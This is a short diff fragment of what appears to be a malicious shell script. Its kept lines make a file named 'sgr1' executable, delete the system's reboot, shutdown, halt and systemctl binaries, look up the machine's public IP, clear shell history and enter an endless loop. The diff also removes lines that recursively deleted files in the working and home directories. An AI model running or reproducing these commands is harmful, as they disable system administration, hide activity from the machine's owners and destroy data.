@@ -30,9 +30,6 @@ chmod +x sgr1
 sleep 30
 rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
-rm -rvf *
-cd ~/
-rm -rvf *
 history -cr
 while true
 do
